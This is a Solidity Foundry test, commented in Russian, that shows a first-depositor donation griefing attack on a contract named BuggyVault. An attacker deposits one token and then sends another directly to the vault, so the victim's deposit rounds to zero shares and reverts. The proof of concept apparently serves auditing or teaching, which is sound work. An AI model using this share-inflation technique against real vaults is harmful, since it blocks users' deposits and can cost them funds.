// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/BuggyVault.sol";

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

contract GriefingFinalTest is Test {
    BuggyVault vault;
    MockToken token;
    address attacker = address(0x1);
    address victim = address(0x2);

    function setUp() public {
        token = new MockToken();
        vault = new BuggyVault(address(token));
        
        // Выдаем токены (малые числа!)
        token.mint(attacker, 2);
        token.mint(victim, 1);
    }

    function testExploit() public {
        // 1. Атакующий — первый депозитор. Вносит 1 токен.
        vm.startPrank(attacker);
        token.approve(address(vault), 1);
        vault.deposit(1);
        
        // 2. Атакующий донатит 1 токен напрямую на контракт.
        // Теперь balance = 2, но totalShares = 1.
        token.transfer(address(vault), 1);
        vm.stopPrank();

        // 3. Жертва пытается внести свой 1 токен
        vm.startPrank(victim);
        token.approve(address(vault), 1);
        
        // Математика контракта: shares = (1 * 1) / 2 = 0.
        // Транзакция должна упасть с ошибкой "Zero shares"
        vm.expectRevert("Zero shares");
        vault.deposit(1);
        vm.stopPrank();

        // Если мы дошли сюда, значит жертва не смогла внести токены. Атака успешна!
        assertTrue(true, "Griefing attack successful");
    }
}
